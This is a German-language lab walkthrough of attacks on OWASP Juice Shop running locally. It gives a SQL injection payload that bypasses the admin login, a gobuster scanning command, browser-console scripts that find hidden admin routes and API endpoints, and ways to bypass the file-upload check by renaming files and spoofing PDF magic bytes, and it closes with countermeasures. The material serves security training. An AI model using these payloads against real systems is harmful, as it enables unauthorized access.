# 🔓 Juice Shop Exploits - Detaillierte Lösungswege

## 1. SQL Injection - Admin Login Bypass

### 📝 Beschreibung
Umgehung der Login-Authentifizierung durch SQL Injection. Diese Schwachstelle ermöglicht es, sich ohne gültige Anmeldedaten als Administrator anzumelden.

### 🛠️ Exploit
```sql
Email: admin@juice-sh.op'--
Passwort: (beliebig)
```

### 💡 Erklärung
- Das `'--` beendet das SQL-Statement vorzeitig
- Der Rest der Query (Passwort-Überprüfung) wird als Kommentar ignoriert
- Resultierende Query: `SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = '...'`

---

## 2. Directory Scanning - Versteckte Dateien finden

### 📝 Beschreibung
Automatisches Scannen der Webapplikation nach versteckten Verzeichnissen und Dateien.

### 🛠️ Befehl
```bash
gobuster dir -u http://localhost:3000 -w common.txt -x js,json,md,txt,pdf --exclude-length 80117
```

### 💡 Parameter-Erklärung
- `-u`: Target URL
- `-w`: Wordlist für Brute-Force
- `-x`: Dateierweiterungen zum Testen
- `--exclude-length`: Ignoriere Responses mit dieser Länge (reduziert False Positives)

---

## 3. Admin Route Discovery - JavaScript Analyse

### 📝 Beschreibung
Verschiedene Methoden zur Entdeckung versteckter Admin-Routen durch Analyse des Frontend-Codes.

### 🔍 METHODE 1: String-Suche in main.js

```javascript
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    console.log('=== SEARCHING FOR ROUTES IN MAIN.JS ===');

    // Verschiedene Suchpattern für Angular-Routen
    const patterns = [
        // Standard Angular Routing
        /when\(['"]([^'"]+)['"],/g,
        /path\s*:\s*['"]([^'"]+)['"]/g,
        /route\s*:\s*['"]([^'"]+)['"]/g,
        
        // Template URLs (geben Hints auf Routen)
        /templateUrl\s*:\s*['"]([^'"]+)['"]/g,
        
        // Hash-basierte Routen
        /#\/[a-zA-Z0-9\-_]+/g,
        
        // String literals mit "/" 
        /['"][\/][a-zA-Z0-9\-_]+['"]/g,
        
        // Angular Route Definitionen
        /\$routeProvider[^}]+/g,
        
        // Suche nach bekannten Wörtern
        /administration/g,
        /score-board/g,
        /dashboard/g,
        /admin/g
    ];
    
    patterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches && matches.length > 0) {
            console.log(`Pattern ${index} (${pattern}) found:`, [...new Set(matches)]);
        }
    });
    
    // Suche nach Strings die "admin" enthalten
    const adminMatches = code.match(/['"]\w*admin\w*['"]/gi);
    if (adminMatches) {
        console.log('Admin-related strings:', [...new Set(adminMatches)]);
    }
})
.catch(error => console.log('Error loading main.js:', error));
```

### 🔍 METHODE 2: Angular Route Discovery

```javascript
console.log('\n=== ANGULAR ROUTE DISCOVERY ===');
try {
    // Prüfe ob Angular verfügbar ist
    if (typeof angular !== 'undefined') {
        console.log('✅ Angular is available!');

        // Hole den $route Service
        const $route = angular.element(document.body).injector().get('$route');
        console.log('📋 All defined routes:');
        
        Object.keys($route.routes).forEach(route => {
            console.log(`🔗 ${route}`, $route.routes[route]);
        });
        
        // Zeige auch den Provider
        const $routeProvider = angular.element(document.body).injector().get('$route');
        console.log('Route configuration:', $routeProvider);
    } else {
        console.log('❌ Angular not found in global scope');
    }
} catch (error) {
    console.log('❌ Error accessing Angular routes:', error.message);

    // Alternative: Versuche verschiedene Angular-Zugriffswege
    try {
        const app = angular.element(document.querySelector('[ng-app]')).scope();
        console.log('Angular app scope:', app);
    } catch (e) {
        console.log('Could not find ng-app');
    }
}
```

### 🔍 METHODE 3: DOM-basierte Suche

```javascript
console.log('\n=== DOM-BASED SEARCH ===');

// Suche in der gesamten HTML-Quelle
const htmlSource = document.documentElement.outerHTML;

// Verschiedene Patterns für Routen-Hinweise
const domPatterns = [
    /#\/[a-zA-Z0-9\-_]+/g,           // Hash-basierte Routen
    /href=['"][^'"]*['"]/g,         // Standard href Attribute
    /ng-href=['"][^'"]*['"]/g,      // Angular ng-href
    /ui-sref=['"][^'"]*['"]/g       // UI-Router Referenzen
];

domPatterns.forEach((pattern, index) => {
    const matches = htmlSource.match(pattern);
    if (matches) {
        const uniqueMatches = [...new Set(matches)];
        console.log(`DOM Pattern ${index}:`, uniqueMatches.slice(0, 10)); // Zeige nur erste 10
    }
});

// Suche nach spezifischen Strings im DOM
const searchTerms = ['administration', 'admin', 'dashboard', 'panel', 'score-board'];
searchTerms.forEach(term => {
    if (htmlSource.toLowerCase().includes(term)) {
        console.log(`✅ Found "${term}" in DOM`);
    }
});
```

### 🔍 METHODE 4: Navigation Element Analysis

```javascript
console.log('\n=== NAVIGATION ANALYSIS ===');

// Finde alle Links und Navigation
const navElements = document.querySelectorAll('a, [ng-click], [ui-sref]');
console.log(`Found ${navElements.length} navigation elements`);

navElements.forEach((element, index) => {
    const href = element.getAttribute('href');
    const ngClick = element.getAttribute('ng-click');
    const uiSref = element.getAttribute('ui-sref');

    if (href && (href.includes('admin') || href.includes('#/'))) {
        console.log(`Nav ${index} href:`, href);
    }
    if (ngClick && ngClick.includes('admin')) {
        console.log(`Nav ${index} ng-click:`, ngClick);
    }
    if (uiSref) {
        console.log(`Nav ${index} ui-sref:`, uiSref);
    }
});
```

### 🔍 METHODE 5: Manual Testing der häufigsten Admin-Routen

```javascript
console.log('\n=== MANUAL ROUTE TESTING ===');

const commonAdminRoutes = [
    '/#/admin',
    '/#/administration',
    '/#/administrator',
    '/#/dashboard',
    '/#/panel',
    '/#/backend',
    '/#/manage',
    '/#/control',
    '/#/score-board',
    '/#/config',
    '/#/settings'
];

console.log('🧪 Test these routes manually:');
commonAdminRoutes.forEach(route => {
    console.log(`🔗 http://localhost:3000${route}`);
});
```

### 🔍 METHODE 6: API Endpoint Discovery

```javascript
console.log('\n=== API ENDPOINT DISCOVERY ===');

// Suche nach API-Endpunkten in JavaScript
fetch('http://localhost:3000/main.js')
.then(response => response.text())
.then(code => {
    const apiPatterns = [
        /\/api\/[^'"]+/g,      // API Endpoints
        /\/rest\/[^'"]+/g,     // REST Endpoints
        /http[s]?:\/\/[^'"]+/g // Externe URLs
    ];

    apiPatterns.forEach((pattern, index) => {
        const matches = code.match(pattern);
        if (matches) {
            console.log(`API Pattern ${index}:`, [...new Set(matches)].slice(0, 10));
        }
    });
});
```

### 🔍 METHODE 7: Local Storage & Session Storage Inspection

```javascript
console.log('\n=== STORAGE INSPECTION ===');

// Schaue was bereits im Storage ist
console.log('LocalStorage keys:', Object.keys(localStorage));
console.log('SessionStorage keys:', Object.keys(sessionStorage));

// Prüfe auf Token oder Route-Informationen
Object.keys(localStorage).forEach(key => {
    const value = localStorage.getItem(key);
    if (value.includes('admin') || value.includes('route')) {
        console.log(`Storage ${key}:`, value);
    }
});
```

### 🔍 METHODE 8: Angular-spezifische Objekte im Window

```javascript
console.log('\n=== AVAILABLE OBJECTS ===');
console.log('Window object keys containing "ng" or "angular":',
    Object.keys(window).filter(key =>
        key.toLowerCase().includes('ng') ||
        key.toLowerCase().includes('angular')
    )
);
```
### 📊 Ergebnisse der Route Discovery

Die Ausführung der obigen Scripts lieferte folgende Ergebnisse:

#### ✅ Gefundene Admin-Routen:
- `/#/administration` - Admin Panel
- `/#/score-board` - Score Board mit allen Challenges

#### ✅ Weitere interessante Routen:
```
path:"accounting"
path:"hacking-instructor"
path:"privacy-security"
path:"data-export"
path:"wallet-web3"
path:"web3-sandbox"
```

#### ✅ API Endpoints:
```
/api/Challenges
/api/Users
/api/Products
/rest/web3
/rest/user/authentication-details/
```

---

## 4. File Upload Bypass - PDF Validation umgehen

### 📝 Beschreibung
Die Juice Shop prüft bei File Uploads nur die Dateiendung, nicht den tatsächlichen Inhalt. Dies ermöglicht das Hochladen von beliebigen Dateien als PDFs.

### 🛠️ Methode 1: Einfache Umbenennung
```bash
# Erstelle beliebiges Dateiformat (z.B ein Script) und verändere die Endung in .pdf
mv malicious_script.sh malicious_script.pdf
```

### 🛠️ Methode 2: Magic Bytes Spoofing
Siehe Script: `ressources/scripts/fake_file_1_rename-extension.sh`
```bash
echo -e '%PDF-1.4\n<?xml version="1.0"?><root>bypass</root>' > bypass.pdf
```

### 🛠️ Methode 3: XML als PDF
Siehe Script: `ressources/scripts/fake_file_2_magic-bytes-spoofing.sh`
```bash
# Erstelle XML Datei
cat > test.xml << EOF
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <message>This is a test XML file</message>
</root>
EOF

# Benenne zu .pdf um
mv test.xml test.pdf
```

### 💡 Warum funktioniert das?
- Die Anwendung prüft nur die Dateiendung (.pdf)
- Der tatsächliche Dateiinhalt (MIME-Type) wird nicht validiert
- Magic Bytes werden nicht überprüft

---

## 📚 Zusammenfassung der Schwachstellen

1. **SQL Injection**: Fehlende Input-Validierung
2. **Information Disclosure**: Exposed Routes in JavaScript
3. **Access Control**: Versteckte Admin-Bereiche ohne Authentifizierung
4. **File Upload**: Unzureichende Dateivalidierung

## 🛡️ Empfohlene Gegenmaßnahmen

1. **SQL Injection**: Prepared Statements verwenden
2. **Route Protection**: Server-seitige Authentifizierung für Admin-Routen
3. **File Validation**: MIME-Type und Magic Bytes prüfen
4. **Security Headers**: CSP, X-Frame-Options, etc. implementieren

